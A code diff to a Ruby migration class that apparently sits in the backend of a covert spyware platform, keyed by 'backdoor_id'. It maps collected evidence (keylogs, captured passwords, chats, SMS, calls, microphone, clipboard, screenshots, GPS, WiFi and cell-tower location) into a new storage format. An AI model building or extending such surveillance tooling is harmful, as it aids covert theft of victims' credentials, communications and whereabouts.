@@ -128,20 +128,109 @@ class LogMigration
 
     # parse log specific data
     ev.data = migrate_data(log)
+
+    # save the binary data
     ev.data[:_grid_size] = log[:longblob1].bytesize
     ev.data[:_grid] = GridFS.instance.put(log[:longblob1], {filename: backdoor_id.to_s}) if log[:longblob1].bytesize > 0
-    
+
     ev.save
   end
 
 
   def self.migrate_data(log)
     data = {}
-
-    # TODO: parse log specific data
+    conversion = {}
+    
+    # parse log specific data
     case log[:type]
+      when 'ADDRESSBOOK'
+        conversion = {:varchar1 => :name, :varchar2 => :contact, :longtext1 => :info}
+      when 'APPLICATION'
+        conversion = {:varchar1 => :process, :varchar2 => :action, :longtext1 => :desc}
+      when 'CALENDAR'
+        conversion = {:varchar1 => :event, :varchar2 => :type, :int1 => :begin, :int2 => :end, :longtext1 => :info}
       when 'CALL'
-        #puts 'call...'
+        conversion = {:varchar1 => :peer, :varchar2 => :program, :int1 => :duration, :int3 => :status}
+      when 'CAMERA'
+        conversion = {}
+      when 'CHAT'
+        conversion = {:varchar1 => :program, :varchar2 => :topic, :varchar3 => :users, :longtext1 => :content}
+      when 'CLIPBOARD'
+        conversion = {:varchar1 => :program, :varchar2 => :window, :longtext1 => :content}
+      when 'DEVICE'
+        conversion = {:longtext1 => :info}
+      when 'DOWNLOAD', 'UPLOAD'
+        conversion = {:varchar1 => :path}
+      when 'FILECAP'
+        conversion = {:varchar1 => :path, :varchar2 => :md5}
+      when 'FILEOPEN'
+        log[:size] = (log[:int1] << 32) + log[:int2]
+        conversion = {:varchar1 => :process, :varchar2 => :md5, :int3 => :access, :size => :size}
+      when 'FILESYSTEM'
+        log[:size] = (log[:int1] << 32) + log[:int2]
+        conversion = {:varchar1 => :path, :int3 => :attr, :size => :size}
+      when 'INFO'
+        conversion = {:longtext1 => :info}
+      when 'KEYLOG'
+        conversion = {:varchar1 => :process, :varchar2 => :window, :longtext1 => :content}
+      when 'LOCATION'
+        case log[:varchar2]
+          when 'IPv4'
+            conversion = {:varchar1 => :ip, :varchar2 => :type}
+          when 'WIFI'
+            log[:wifi] = log[:varchar1].split("\n")
+            conversion = {:wifi => :wifi, :varchar2 => :type}
+          when 'GSM', 'CDMA'
+            log[:cell] = log[:varchar1].split("\n")
+            conversion = {:cell => :cell, :varchar2 => :type}
+          when 'GPS'
+            log[:latitude], log[:longitude] = log[:varchar1].split(' ') unless log[:varchar1].nil?
+            conversion = {:latitude => :latitude, :longitude => :longitude, :varchar2 => :type}
+        end
+      when 'MAIL', 'MMS', 'SMS'
+        conversion = {:varchar1 => :from, :varchar2 => :to, :varchar3 => :subject, :int1 => :size, :int2 => :status, :longtext1 => :content}
+      when 'MIC'
+        conversion = {:int1 => :duration, :int3 => :status}
+      when 'MOUSE'
+        conversion = {:varchar1 => :process, :varchar2 => :window, :int2 => :x, :int3 => :y, :int1 => :resolution}
+      when 'PASSWORD'
+        conversion = {:varchar1 => :program, :varchar2 => :service, :varchar3 => :pass, :varchar4 => :user}
+      when 'PRINT'
+        conversion = {:varchar1 => :spool, :longtext1 => :ocr}
+      when 'SNAPSHOT'
+        conversion = {:varchar1 => :process, :varchar2 => :window, :longtext1 => :ocr}
+      when 'URL'
+        conversion = {:varchar1 => :url, :varchar2 => :browser, :varchar3 => :title, :varchar4 => :keywords, :longtext1 => :ocr}
+    end
+
+    conversion.each_pair do |k, v|
+      data[v] = log[k]
+    end
+
+    # post processing for location parsing to new format
+    if data[:wifi]
+      data[:wifi].each_index do |index|
+        re = '((?:[0-9A-F][0-9A-F]:){5}(?:[0-9A-F][0-9A-F]))(?![:0-9A-F]) \\[([-+]\\d+)\\] (.*)'
+        m = Regexp.new(re, Regexp::IGNORECASE).match(data[:wifi][index])
+        wifi = {:mac => m[1], :sig => m[2].to_i, :bssid => m[3]} unless m.nil?
+        data[:wifi][index] = wifi
+      end
+    end
+
+    if data[:cell]
+      data[:cell].each_index do |index|
+        if data[:type] == 'GSM'
+          re = "MCC:(\\d+) MNC:(\\d+) LAC:(\\d+) CID:(\\d+) dBm:([-+]\\d+) ADV:(\\d+) AGE:(\\d+)"
+          m = Regexp.new(re, Regexp::IGNORECASE).match(data[:cell][index])
+          cell = {:mcc => m[1].to_i, :mnc => m[2].to_i, :lac => m[3].to_i, :cid => m[4].to_i, :db => m[5].to_i, :adv => m[6].to_i, :age => m[7].to_i} unless m.nil?
+        end
+        if data[:type] == 'CDMA'
+          re = "MCC:(\\d+) SID:(\\d+) NID:(\\d+) BID:(\\d+) dBm:([-+]\\d+) ADV:(\\d+) AGE:(\\d+)"
+          m = Regexp.new(re, Regexp::IGNORECASE).match(data[:cell][index])
+          cell = {:mcc => m[1].to_i, :sid => m[2].to_i, :nid => m[3].to_i, :bid => m[4].to_i, :db => m[5].to_i, :adv => m[6].to_i, :age => m[7].to_i} unless m.nil?
+        end
+        data[:cell][index] = cell
+      end
     end
 
     return data
